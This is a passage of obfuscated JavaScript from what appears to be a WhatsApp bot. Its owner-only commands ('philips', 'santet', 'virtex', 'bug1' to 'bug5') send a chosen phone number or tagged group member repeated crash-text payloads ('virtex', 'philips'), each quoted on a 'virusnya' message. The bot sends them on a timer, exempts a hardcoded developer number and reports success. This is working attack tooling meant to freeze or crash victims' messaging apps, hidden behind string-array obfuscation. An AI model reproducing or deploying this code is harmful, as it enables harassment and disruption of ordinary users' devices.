_0x327bcb=_0x327b();return _0x49f3=function(_0x49f3aa,_0x22364c){_0x49f3aa=_0x49f3aa-0x1bd;var _0x3eacc7=_0x327bcb[_0x49f3aa];return _0x3eacc7;},_0x49f3(_0x3630ea,_0x474aa9);}if(num==sender)return reply(_0x3c1d14(0x1be));await sleep(0xbb8),conn[_0x3c1d14(0x1c4)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x3c1d14(0x1c6)+num['split']('@')[0x0],[num]);
}
break
case 'philips2':{
var _0x37936c=_0x14ae;(function(_0x4988b3,_0x276c0d){var _0x698e01=_0x14ae,_0x10d112=_0x4988b3();while(!![]){try{var _0xc5b523=parseInt(_0x698e01(0xb0))/0x1*(-parseInt(_0x698e01(0xb3))/0x2)+parseInt(_0x698e01(0xaf))/0x3*(parseInt(_0x698e01(0xa5))/0x4)+-parseInt(_0x698e01(0xaa))/0x5*(-parseInt(_0x698e01(0xad))/0x6)+parseInt(_0x698e01(0xb2))/0x7+parseInt(_0x698e01(0xb5))/0x8*(-parseInt(_0x698e01(0xa3))/0x9)+-parseInt(_0x698e01(0xa8))/0xa+parseInt(_0x698e01(0xa6))/0xb;if(_0xc5b523===_0x276c0d)break;else _0x10d112['push'](_0x10d112['shift']());}catch(_0x9d7734){_0x10d112['push'](_0x10d112['shift']());}}}(_0x373e,0x3d5f6));if(!isOwner)return reply(mess[_0x37936c(0xae)]);if(!q)return reply(_0x37936c(0xab)+(prefix+command)+'\x20628xxx');function _0x373e(){var _0x10ddb5=['9ddSxmw','split','5260ixrTJF','2607979zSAdUX','Itu\x20Nomor\x20Lu\x20Sendiri','2325160TsEpOs','Sukses\x20kirim\x20*','3215oIEuZv','Syntak\x20Error!\x0a*Contoh:*\x0a','6283834558105@s.whatsapp.net','492BCsQAP','OnlyOwner','834MvQBRS','418423zSNuvy','sendMessage','3320863wFINQg','2hEecVq','*\x20to\x20@','1819784ufoQZM'];_0x373e=function(){return _0x10ddb5;};return _0x373e();}function _0x14ae(_0x4279e7,_0x24a330){var _0x373e45=_0x373e();return _0x14ae=function(_0x14ae5d,_0x37da18){_0x14ae5d=_0x14ae5d-0xa3;var _0xf9e532=_0x373e45[_0x14ae5d];return _0xf9e532;},_0x14ae(_0x4279e7,_0x24a330);}var num=q+'@s.whatsapp.net',dev=_0x37936c(0xac);if(num==dev)return reply('Itu\x20developer\x20gua');if(num==sender)return reply(_0x37936c(0xa7));await sleep(0xbb8),conn[_0x37936c(0xb1)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x37936c(0xb1)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x37936c(0xa9)+command+_0x37936c(0xb4)+num[_0x37936c(0xa4)]('@')[0x0],[num]);
}
break
case 'philips3':{
var _0x5169cc=_0x462b;(function(_0x529ca1,_0x4316be){var _0x3bd43b=_0x462b,_0x258301=_0x529ca1();while(!![]){try{var _0x789c3b=-parseInt(_0x3bd43b(0x1b0))/0x1+parseInt(_0x3bd43b(0x1ae))/0x2+parseInt(_0x3bd43b(0x1a9))/0x3*(parseInt(_0x3bd43b(0x1ad))/0x4)+-parseInt(_0x3bd43b(0x1a8))/0x5*(-parseInt(_0x3bd43b(0x1af))/0x6)+parseInt(_0x3bd43b(0x1b5))/0x7+-parseInt(_0x3bd43b(0x1a2))/0x8+-parseInt(_0x3bd43b(0x1b1))/0x9;if(_0x789c3b===_0x4316be)break;else _0x258301['push'](_0x258301['shift']());}catch(_0x12aaf1){_0x258301['push'](_0x258301['shift']());}}}(_0x3767,0x27a47));function _0x3767(){var _0x10f0a1=['402920aPWjZV','2227752GpUYsm','@s.whatsapp.net','Syntak\x20Error!\x0a*Contoh:*\x0a','Itu\x20Nomor\x20Lu\x20Sendiri','sendMessage','\x20628xxx','15525litWTe','953643Kvhirg','6283834558105@s.whatsapp.net','Itu\x20developer\x20gua','OnlyOwner','4UnnfXW','106822nurnvq','438uzZpcG','166581vCBaih','432828BNBlxS','Sukses\x20kirim\x20*','*\x20to\x20@','split'];_0x3767=function(){return _0x10f0a1;};return _0x3767();}function _0x462b(_0x412dc1,_0x2fa89a){var _0x37673d=_0x3767();return _0x462b=function(_0x462b00,_0x25936f){_0x462b00=_0x462b00-0x1a2;var _0x349125=_0x37673d[_0x462b00];return _0x349125;},_0x462b(_0x412dc1,_0x2fa89a);}if(!isOwner)return reply(mess[_0x5169cc(0x1ac)]);if(!q)return reply(_0x5169cc(0x1a4)+(prefix+command)+_0x5169cc(0x1a7));var num=q+_0x5169cc(0x1a3),dev=_0x5169cc(0x1aa);if(num==dev)return reply(_0x5169cc(0x1ab));if(num==sender)return reply(_0x5169cc(0x1a5));conn[_0x5169cc(0x1a6)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x5169cc(0x1a6)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x5169cc(0x1b2)+command+_0x5169cc(0x1b3)+num[_0x5169cc(0x1b4)]('@')[0x0],[num]);
}
break
case 'santet':{
var _0x31bc0d=_0x4c01;(function(_0x19d87a,_0x1d1127){var _0x31e58a=_0x4c01,_0x7ab45c=_0x19d87a();while(!![]){try{var _0x1011b0=-parseInt(_0x31e58a(0x132))/0x1+parseInt(_0x31e58a(0x139))/0x2*(parseInt(_0x31e58a(0x13f))/0x3)+-parseInt(_0x31e58a(0x134))/0x4*(parseInt(_0x31e58a(0x131))/0x5)+parseInt(_0x31e58a(0x12e))/0x6*(parseInt(_0x31e58a(0x12f))/0x7)+parseInt(_0x31e58a(0x133))/0x8+-parseInt(_0x31e58a(0x13b))/0x9*(-parseInt(_0x31e58a(0x13a))/0xa)+-parseInt(_0x31e58a(0x13d))/0xb;if(_0x1011b0===_0x1d1127)break;else _0x7ab45c['push'](_0x7ab45c['shift']());}catch(_0x1c005e){_0x7ab45c['push'](_0x7ab45c['shift']());}}}(_0x367f,0x96857));if(!isOwner)return reply(mess[_0x31bc0d(0x137)]);if(!isGroup)return reply(mess['OnlyGrup']);function _0x367f(){var _0x156725=['7750256CuImYQ','1878460rhtrZj','Tag\x20atau\x20reply\x20orang\x20yg\x20mau\x20santet\x0a\x0a*Contoh:*\x20#santet\x20@tag','sendMessage','OnlyOwner','length','68BABFPT','9210safrab','10809xJRbgA','*\x20to\x20@','12983113hkedDv','Sukses\x20kirim\x20*','69051BFozdg','18XFXOME','790300WxvHQD','split','10JihKod','460133ZnoWla'];_0x367f=function(){return _0x156725;};return _0x367f();}var number;function _0x4c01(_0x598507,_0x3414cc){var _0x367f55=_0x367f();return _0x4c01=function(_0x4c01ed,_0x291256){_0x4c01ed=_0x4c01ed-0x12e;var _0x370a5e=_0x367f55[_0x4c01ed];return _0x370a5e;},_0x4c01(_0x598507,_0x3414cc);}if(mentionUser[_0x31bc0d(0x138)]!==0x0)number=mentionUser[0x0],await sleep(0xbb8),conn[_0x31bc0d(0x136)](number,{'text':philips},{'quoted':virusnya}),mentions(_0x31bc0d(0x13e)+command+_0x31bc0d(0x13c)+number[_0x31bc0d(0x130)]('@')[0x0],[number]);else isQuotedMsg?(number=quotedMsg['sender'],await sleep(0xbb8),conn[_0x31bc0d(0x136)](number,{'text':philips},{'quoted':virusnya}),mentions(_0x31bc0d(0x13e)+command+'*\x20to\x20@'+number['split']('@')[0x0],[number])):reply(_0x31bc0d(0x135));
}
break
case 'santet2':{
var _0x590317=_0xa13d;(function(_0x1ca161,_0x42a146){var _0xab5965=_0xa13d,_0x4de713=_0x1ca161();while(!![]){try{var _0x2a603d=parseInt(_0xab5965(0x6c))/0x1+parseInt(_0xab5965(0x65))/0x2*(parseInt(_0xab5965(0x74))/0x3)+parseInt(_0xab5965(0x67))/0x4+-parseInt(_0xab5965(0x73))/0x5*(parseInt(_0xab5965(0x70))/0x6)+parseInt(_0xab5965(0x6b))/0x7+parseInt(_0xab5965(0x72))/0x8+-parseInt(_0xab5965(0x6d))/0x9;if(_0x2a603d===_0x42a146)break;else _0x4de713['push'](_0x4de713['shift']());}catch(_0x2fce0d){_0x4de713['push'](_0x4de713['shift']());}}}(_0x1d9f,0xadf99));function _0xa13d(_0x191784,_0x4c7d6f){var _0x1d9f5e=_0x1d9f();return _0xa13d=function(_0xa13d4d,_0x3bf0e8){_0xa13d4d=_0xa13d4d-0x65;var _0x48dd7b=_0x1d9f5e[_0xa13d4d];return _0x48dd7b;},_0xa13d(_0x191784,_0x4c7d6f);}if(!isOwner)return reply(mess[_0x590317(0x6a)]);if(!isGroup)return reply(mess['OnlyGrup']);function _0x1d9f(){var _0x545577=['*\x20to\x20@','sender','OnlyOwner','7901831jfaDde','300147yagJdm','19364652eOajtf','sendMessage','split','6qvVSxj','Sukses\x20kirim\x20*','3064632vouKcX','1806095IouxSR','3eyOENJ','2259566pGgqrg','Tag\x20atau\x20reply\x20orang\x20yg\x20mau\x20santet\x0a\x0a*Contoh:*\x20#santet\x20@tag','1134424ToipKe'];_0x1d9f=function(){return _0x545577;};return _0x1d9f();}var number;if(mentionUser['length']!==0x0)number=mentionUser[0x0],await sleep(0xbb8),conn[_0x590317(0x6e)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x590317(0x6e)](number,{'text':philips},{'quoted':virusnya}),mentions(_0x590317(0x71)+command+_0x590317(0x68)+number[_0x590317(0x6f)]('@')[0x0],[number]);else isQuotedMsg?(number=quotedMsg[_0x590317(0x69)],await sleep(0xbb8),conn[_0x590317(0x6e)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](number,{'text':philips},{'quoted':virusnya}),mentions(_0x590317(0x71)+command+_0x590317(0x68)+number[_0x590317(0x6f)]('@')[0x0],[number])):reply(_0x590317(0x66));
}
break
case 'santet3':{
function _0x42c2(){var _0x4ad10d=['1407444BxvcVM','sender','Tag\x20atau\x20reply\x20orang\x20yg\x20mau\x20santet\x0a\x0a*Contoh:*\x20#santet\x20@tag','1899846dHlcbk','length','2309181HIpMQr','split','*\x20to\x20@','2894375MXcBFT','sendMessage','Sukses\x20kirim\x20*','OnlyOwner','OnlyGrup','32VSGOEk','4611945KGPywa','2394TnBOWk','111210gPQBlp','4duKuEL','116177lSSSlj'];_0x42c2=function(){return _0x4ad10d;};return _0x42c2();}var _0x518bd5=_0x4a2b;(function(_0x49ade8,_0x117cd5){var _0xeb848b=_0x4a2b,_0x9fb9c=_0x49ade8();while(!![]){try{var _0x4f811a=-parseInt(_0xeb848b(0x178))/0x1+parseInt(_0xeb848b(0x179))/0x2+-parseInt(_0xeb848b(0x174))/0x3+parseInt(_0xeb848b(0x177))/0x4*(parseInt(_0xeb848b(0x16e))/0x5)+-parseInt(_0xeb848b(0x17c))/0x6+parseInt(_0xeb848b(0x17e))/0x7*(-parseInt(_0xeb848b(0x173))/0x8)+parseInt(_0xeb848b(0x175))/0x9*(parseInt(_0xeb848b(0x176))/0xa);if(_0x4f811a===_0x117cd5)break;else _0x9fb9c['push'](_0x9fb9c['shift']());}catch(_0x597554){_0x9fb9c['push'](_0x9fb9c['shift']());}}}(_0x42c2,0xe834e));if(!isOwner)return reply(mess[_0x518bd5(0x171)]);if(!isGroup)return reply(mess[_0x518bd5(0x172)]);var number;function _0x4a2b(_0x3a3cd3,_0x1adb78){var _0x42c260=_0x42c2();return _0x4a2b=function(_0x4a2b4f,_0x4e94eb){_0x4a2b4f=_0x4a2b4f-0x16e;var _0x8581ac=_0x42c260[_0x4a2b4f];return _0x8581ac;},_0x4a2b(_0x3a3cd3,_0x1adb78);}if(mentionUser[_0x518bd5(0x17d)]!==0x0)number=mentionUser[0x0],await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](number,{'text':philips},{'quoted':virusnya}),mentions(_0x518bd5(0x170)+command+_0x518bd5(0x180)+number[_0x518bd5(0x17f)]('@')[0x0],[number]);else isQuotedMsg?(number=quotedMsg[_0x518bd5(0x17a)],await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),mentions('Sukses\x20kirim\x20*'+command+_0x518bd5(0x180)+number['split']('@')[0x0],[number])):reply(_0x518bd5(0x17b));
}
break
case 'virtex':{
var _0x27cee7=_0x5d69;(function(_0xdcdc35,_0x48d44a){var _0x2f2d82=_0x5d69,_0x2e1cd8=_0xdcdc35();while(!![]){try{var _0x4ba584=-parseInt(_0x2f2d82(0x176))/0x1+-parseInt(_0x2f2d82(0x17e))/0x2+parseInt(_0x2f2d82(0x171))/0x3+parseInt(_0x2f2d82(0x16f))/0x4*(-parseInt(_0x2f2d82(0x175))/0x5)+-parseInt(_0x2f2d82(0x17d))/0x6*(parseInt(_0x2f2d82(0x179))/0x7)+-parseInt(_0x2f2d82(0x174))/0x8*(parseInt(_0x2f2d82(0x178))/0x9)+-parseInt(_0x2f2d82(0x172))/0xa*(-parseInt(_0x2f2d82(0x177))/0xb);if(_0x4ba584===_0x48d44a)break;else _0x2e1cd8['push'](_0x2e1cd8['shift']());}catch(_0x35b89c){_0x2e1cd8['push'](_0x2e1cd8['shift']());}}}(_0x3ea5,0x61ced));function _0x3ea5(){var _0x12d9d0=['7RgSmPe','\x20628xxx','itu\x20nomor\x20lu\x20sendiri','6283834558105@s.whatsapp.net','2613252dOUlcM','1392020ZWAAZU','Sukses\x20kirim\x20*','Syntak\x20Error!\x0a*Contoh:*\x0a','72LmlBPD','Itu\x20developer\x20gua','1102254OpfEXf','2355510hTqUgy','@s.whatsapp.net','2121224qLsVPo','98885RtwqEX','68912YTfeJb','99CQWRqx','18uUrXEP'];_0x3ea5=function(){return _0x12d9d0;};return _0x3ea5();}if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply(_0x27cee7(0x180)+(prefix+command)+_0x27cee7(0x17a));var num=q+_0x27cee7(0x173),dev=_0x27cee7(0x17c);if(num==dev)return reply(_0x27cee7(0x170));if(num==sender)return reply(_0x27cee7(0x17b));function _0x5d69(_0xf20660,_0x5de47f){var _0x3ea5d8=_0x3ea5();return _0x5d69=function(_0x5d6954,_0x8051ff){_0x5d6954=_0x5d6954-0x16f;var _0x2702e6=_0x3ea5d8[_0x5d6954];return _0x2702e6;},_0x5d69(_0xf20660,_0x5de47f);}conn['sendMessage'](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x27cee7(0x17f)+command+'*\x20to\x20@'+num['split']('@')[0x0],[num]);
}
break
case 'virtex2':{
}
break
case 'virtex3':{
function _0x1bef(_0x2090a2,_0x43ad4b){var _0x1d6363=_0x1d63();return _0x1bef=function(_0x1bef4a,_0x2ac487){_0x1bef4a=_0x1bef4a-0x83;var _0x3782d3=_0x1d6363[_0x1bef4a];return _0x3782d3;},_0x1bef(_0x2090a2,_0x43ad4b);}var _0x1823b4=_0x1bef;(function(_0x5214c3,_0xfbbef1){var _0x34f073=_0x1bef,_0x5e3334=_0x5214c3();while(!![]){try{var _0x3285ad=-parseInt(_0x34f073(0x8b))/0x1*(-parseInt(_0x34f073(0x94))/0x2)+parseInt(_0x34f073(0x88))/0x3+parseInt(_0x34f073(0x91))/0x4*(-parseInt(_0x34f073(0x8c))/0x5)+parseInt(_0x34f073(0x89))/0x6*(-parseInt(_0x34f073(0x83))/0x7)+parseInt(_0x34f073(0x96))/0x8*(parseInt(_0x34f073(0x92))/0x9)+-parseInt(_0x34f073(0x8e))/0xa+parseInt(_0x34f073(0x84))/0xb;if(_0x3285ad===_0xfbbef1)break;else _0x5e3334['push'](_0x5e3334['shift']());}catch(_0x412a3a){_0x5e3334['push'](_0x5e3334['shift']());}}}(_0x1d63,0x323ad));if(!isOwner)return reply(mess[_0x1823b4(0x86)]);if(!q)return reply('Syntak\x20Error!\x0a*Contoh:*\x0a'+(prefix+command)+_0x1823b4(0x97));function _0x1d63(){var _0x524932=['6283834558105@s.whatsapp.net','551175rYzkGD','906lKYUlP','sendMessage','1Vgfoxw','9910JrnEXP','*\x20to\x20@','2178570ZqaSvu','Itu\x20developer\x20gua','itu\x20nomor\x20lu\x20sendiri','420EhVnZo','18ZSSyLc','Sukses\x20kirim\x20*','340894DPzauC','split','1293616QnQeXq','\x20628xxx','9023qvNMfE','1636481GIKDKz','@s.whatsapp.net','OnlyOwner'];_0x1d63=function(){return _0x524932;};return _0x1d63();}var num=q+_0x1823b4(0x85),dev=_0x1823b4(0x87);if(num==dev)return reply(_0x1823b4(0x8f));if(num==sender)return reply(_0x1823b4(0x90));conn[_0x1823b4(0x8a)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x1823b4(0x8a)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x1823b4(0x93)+command+_0x1823b4(0x8d)+num[_0x1823b4(0x95)]('@')[0x0],[num]);
}
break
case 'bug1':{
var _0x4670fa=_0x3b16;(function(_0x3ca0be,_0xcbb406){var _0x53ca11=_0x3b16,_0x20d8a5=_0x3ca0be();while(!![]){try{var _0x5def0a=-parseInt(_0x53ca11(0xb6))/0x1+parseInt(_0x53ca11(0xb1))/0x2*(-parseInt(_0x53ca11(0xaa))/0x3)+parseInt(_0x53ca11(0xab))/0x4*(-parseInt(_0x53ca11(0xb3))/0x5)+parseInt(_0x53ca11(0xb0))/0x6*(parseInt(_0x53ca11(0xb9))/0x7)+parseInt(_0x53ca11(0xa9))/0x8*(parseInt(_0x53ca11(0xbb))/0x9)+-parseInt(_0x53ca11(0xb4))/0xa*(-parseInt(_0x53ca11(0xb8))/0xb)+parseInt(_0x53ca11(0xa8))/0xc;if(_0x5def0a===_0xcbb406)break;else _0x20d8a5['push'](_0x20d8a5['shift']());}catch(_0x2dac36){_0x20d8a5['push'](_0x20d8a5['shift']());}}}(_0x22ef,0xc79ca));if(!isOwner)return reply(mess[_0x4670fa(0xaf)]);if(!q)return reply(_0x4670fa(0xad)+(prefix+command)+_0x4670fa(0xb2));var num=q+_0x4670fa(0xb5),dev=_0x4670fa(0xb7);function _0x22ef(){var _0x5abd99=['36vWZzzD','3442luaYbz','\x20628xxx','55wNZEaX','1580ylXwFg','@s.whatsapp.net','1448638OvCqwp','6283834558105@s.whatsapp.net','69487CzxhtZ','1282694EgbpBT','*\x20to\x20@','1929987rsFWJk','itu\x20nomor\x20lu\x20sendiri','sendMessage','2507016DZankP','56LrEtxv','1617yBCTmV','223160LxBYkR','Sukses\x20kirim\x20*','Syntak\x20Error!\x0a*Contoh:*\x0a','Itu\x20developer\x20gua','OnlyOwner'];_0x22ef=function(){return _0x5abd99;};return _0x22ef();}if(num==dev)return reply(_0x4670fa(0xae));if(num==sender)return reply(_0x4670fa(0xbc));function _0x3b16(_0x483f9b,_0x2f50cc){var _0x22ef2a=_0x22ef();return _0x3b16=function(_0x3b16ef,_0x19a01f){_0x3b16ef=_0x3b16ef-0xa8;var _0x3e30a1=_0x22ef2a[_0x3b16ef];return _0x3e30a1;},_0x3b16(_0x483f9b,_0x2f50cc);}conn[_0x4670fa(0xbd)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x4670fa(0xac)+command+_0x4670fa(0xba)+num['split']('@')[0x0],[num]);
}
break
case 'bug2':{
var _0x42d092=_0x536d;function _0x2b63(){var _0x5808a6=['108AvCJyW','\x20628xxx','473925aeKggm','Itu\x20developer\x20gua','943588kiMqYf','423261RtvRLq','Syntak\x20Error!\x0a*Contoh:*\x0a','sendMessage','9MAishW','24VgIMHO','itu\x20nomor\x20lu\x20sendiri','245370dRqgXC','725942vjwefU','Sukses\x20kirim\x20*','split','6283834558105@s.whatsapp.net','*\x20to\x20@','246710cynHKL','671178RAovaF'];_0x2b63=function(){return _0x5808a6;};return _0x2b63();}(function(_0x4d803d,_0x466db1){var _0x252176=_0x536d,_0x1d7992=_0x4d803d();while(!![]){try{var _0x10bbe5=-parseInt(_0x252176(0xcd))/0x1+parseInt(_0x252176(0xd3))/0x2*(-parseInt(_0x252176(0xd0))/0x3)+parseInt(_0x252176(0xcc))/0x4+parseInt(_0x252176(0xdd))/0x5+parseInt(_0x252176(0xda))/0x6+-parseInt(_0x252176(0xd4))/0x7*(-parseInt(_0x252176(0xd1))/0x8)+-parseInt(_0x252176(0xdb))/0x9*(-parseInt(_0x252176(0xd9))/0xa);if(_0x10bbe5===_0x466db1)break;else _0x1d7992['push'](_0x1d7992['shift']());}catch(_0x54e6f5){_0x1d7992['push'](_0x1d7992['shift']());}}}(_0x2b63,0x3f15f));if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply(_0x42d092(0xce)+(prefix+command)+_0x42d092(0xdc));var num=q+'@s.whatsapp.net',dev=_0x42d092(0xd7);if(num==dev)return reply(_0x42d092(0xde));if(num==sender)return reply(_0x42d092(0xd2));function _0x536d(_0x1a8930,_0x20a391){var _0x2b637c=_0x2b63();return _0x536d=function(_0x536d66,_0x515670){_0x536d66=_0x536d66-0xcc;var _0x9860a0=_0x2b637c[_0x536d66];return _0x9860a0;},_0x536d(_0x1a8930,_0x20a391);}conn[_0x42d092(0xcf)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x42d092(0xd5)+command+_0x42d092(0xd8)+num[_0x42d092(0xd6)]('@')[0x0],[num]);
}
break
case 'bug3':{
var _0x38d798=_0x53f4;(function(_0xf63720,_0x5071bf){var _0x52a435=_0x53f4,_0x237270=_0xf63720();while(!![]){try{var _0x48709a=parseInt(_0x52a435(0xd8))/0x1+parseInt(_0x52a435(0xd3))/0x2*(-parseInt(_0x52a435(0xd0))/0x3)+-parseInt(_0x52a435(0xde))/0x4*(parseInt(_0x52a435(0xd5))/0x5)+parseInt(_0x52a435(0xdb))/0x6+-parseInt(_0x52a435(0xdd))/0x7*(parseInt(_0x52a435(0xd9))/0x8)+parseInt(_0x52a435(0xd2))/0x9*(parseInt(_0x52a435(0xce))/0xa)+parseInt(_0x52a435(0xdf))/0xb*(parseInt(_0x52a435(0xe0))/0xc);if(_0x48709a===_0x5071bf)break;else _0x237270['push'](_0x237270['shift']());}catch(_0x1cbac2){_0x237270['push'](_0x237270['shift']());}}}(_0x3e95,0x86971));if(!isOwner)return reply(mess[_0x38d798(0xd7)]);if(!q)return reply(_0x38d798(0xd1)+(prefix+command)+'\x20628xxx');var num=q+_0x38d798(0xd4),dev=_0x38d798(0xcf);function _0x53f4(_0x8fef2d,_0x54a4af){var _0x3e95a3=_0x3e95();return _0x53f4=function(_0x53f4f6,_0x166a49){_0x53f4f6=_0x53f4f6-0xce;var _0x1e5f32=_0x3e95a3[_0x53f4f6];return _0x1e5f32;},_0x53f4(_0x8fef2d,_0x54a4af);}function _0x3e95(){var _0x45df27=['*\x20to\x20@','17367NAhRjl','1432IZHyNY','668470dWjQFa','312SPwGtJ','10NoZrRv','6283834558105@s.whatsapp.net','1410963oijtVD','Syntak\x20Error!\x0a*Contoh:*\x0a','3608541sqsylK','4aPLpLE','@s.whatsapp.net','225moAmQt','sendMessage','OnlyOwner','135049YAIBWC','2184UsAFgR','itu\x20nomor\x20lu\x20sendiri','415968tQtCsH'];_0x3e95=function(){return _0x45df27;};return _0x3e95();}if(num==dev)return reply('Itu\x20developer\x20gua');if(num==sender)return reply(_0x38d798(0xda));conn['sendMessage'](num,{'text':'p'},{'quoted':virusnya}),conn[_0x38d798(0xd6)](num,{'text':virtex()},{'quoted':virusnya}),conn['sendMessage'](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),mentions('Sukses\x20kirim\x20*'+command+_0x38d798(0xdc)+num['split']('@')[0x0],[num]);
}
break
case 'bug4':{
var _0x4a373b=_0x26fe;(function(_0x24f6df,_0x42903f){var _0x312b89=_0x26fe,_0x486d3c=_0x24f6df();while(!![]){try{var _0x32ed97=parseInt(_0x312b89(0x19f))/0x1*(parseInt(_0x312b89(0x1a2))/0x2)+-parseInt(_0x312b89(0x19d))/0x3*(parseInt(_0x312b89(0x196))/0x4)+parseInt(_0x312b89(0x191))/0x5*(-parseInt(_0x312b89(0x192))/0x6)+parseInt(_0x312b89(0x198))/0x7*(-parseInt(_0x312b89(0x1a1))/0x8)+parseInt(_0x312b89(0x19a))/0x9+parseInt(_0x312b89(0x1a0))/0xa*(-parseInt(_0x312b89(0x195))/0xb)+parseInt(_0x312b89(0x194))/0xc;if(_0x32ed97===_0x42903f)break;else _0x486d3c['push'](_0x486d3c['shift']());}catch(_0x39f667){_0x486d3c['push'](_0x486d3c['shift']());}}}(_0x18e6,0x6480d));if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply(_0x4a373b(0x19e)+(prefix+command)+_0x4a373b(0x19b));function _0x18e6(){var _0x15951a=['4846504qXNiQN','556tgqsln','5LnhZgA','1902546TfdmYE','@s.whatsapp.net','11328732YkpkEo','11vbmUUU','1076kMmQMq','split','7TqEDQF','itu\x20nomor\x20lu\x20sendiri','4772385rwbWAh','\x20628xxx','sendMessage','2766Tjpouy','Syntak\x20Error!\x0a*Contoh:*\x0a','653ddBdhA','732770YTLJBe'];_0x18e6=function(){return _0x15951a;};return _0x18e6();}function _0x26fe(_0x492640,_0x405183){var _0x18e608=_0x18e6();return _0x26fe=function(_0x26feff,_0x4010f8){_0x26feff=_0x26feff-0x191;var _0x472f44=_0x18e608[_0x26feff];return _0x472f44;},_0x26fe(_0x492640,_0x405183);}var num=q+_0x4a373b(0x193),dev='6283834558105@s.whatsapp.net';if(num==dev)return reply('Itu\x20developer\x20gua');if(num==sender)return reply(_0x4a373b(0x199));await sleep(0xbb8),conn[_0x4a373b(0x19c)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x4a373b(0x19c)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions('Sukses\x20kirim\x20*'+command+'*\x20to\x20@'+num[_0x4a373b(0x197)]('@')[0x0],[num]);
}
break
case 'bug5':{
var _0x43b91c=_0x2f46;function _0x495b(){var _0x1051e8=['itu\x20nomor\x20lu\x20sendiri','64706WpNRlB','@s.whatsapp.net','sendMessage','*\x20to\x20@','Sukses\x20kirim\x20*','1665XMxnaR','OnlyOwner','split','4037VWMSbt','91116ZyPZLs','34QvKAuA','425865HIkrcO','7931646XXepRU','Itu\x20developer\x20gua','5EGnYaC','5264480QVVfsB','16440SwTlSr','7417914mRgZjJ','4FfGjRS'];_0x495b=function(){return _0x1051e8;};return _0x495b();}function _0x2f46(_0x1c7250,_0x2a6498){var _0x495bfa=_0x495b();return _0x2f46=function(_0x2f468a,_0x44903a){_0x2f468a=_0x2f468a-0xe7;var _0x4f126f=_0x495bfa[_0x2f468a];return _0x4f126f;},_0x2f46(_0x1c7250,_0x2a6498);}(function(_0x2f864c,_0x388f1f){var _0x2017e7=_0x2f46,_0x48a739=_0x2f864c();while(!![]){try{var _0x1ebace=-parseInt(_0x2017e7(0xf7))/0x1*(parseInt(_0x2017e7(0xed))/0x2)+-parseInt(_0x2017e7(0xee))/0x3*(parseInt(_0x2017e7(0xf5))/0x4)+parseInt(_0x2017e7(0xf1))/0x5*(parseInt(_0x2017e7(0xef))/0x6)+-parseInt(_0x2017e7(0xf4))/0x7+parseInt(_0x2017e7(0xf3))/0x8*(-parseInt(_0x2017e7(0xe8))/0x9)+-parseInt(_0x2017e7(0xf2))/0xa+-parseInt(_0x2017e7(0xeb))/0xb*(-parseInt(_0x2017e7(0xec))/0xc);if(_0x1ebace===_0x388f1f)break;else _0x48a739['push'](_0x48a739['shift']());}catch(_0x15db8e){_0x48a739['push'](_0x48a739['shift']());}}}(_0x495b,0xdbcc2));if(!isOwner)return reply(mess[_0x43b91c(0xe9)]);if(!q)return reply('Syntak\x20Error!\x0a*Contoh:*\x0a'+(prefix+command)+'\x20628xxx');var num=q+_0x43b91c(0xf8),dev='6283834558105@s.whatsapp.net';if(num==dev)return reply(_0x43b91c(0xf0));if(num==sender)return reply(_0x43b91c(0xf6));await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x43b91c(0xe7)+command+_0x43b91c(0xfa)+num[_0x43b91c(0xea)]('@')[0x0],[num]);
}
break
//SOUND MENU
case 'sound1':case 'sound2':
case 'sound3':case 'sound4':case 'sound5':case 'sound6':
case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':
case 'sound15':case 'sound16':case 'sound17':case 'sound18':
case 'sound19':case 'sound20':case 'sound21':case 'sound22':
case 'sound23':case 'sound24':case 'sound25':case 'sound26':
case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':
case 'sound35':case 'sound36':case 'sound37':case 'sound38':
case 'sound39':case 'sound40':case 'sound41':case 'sound42':
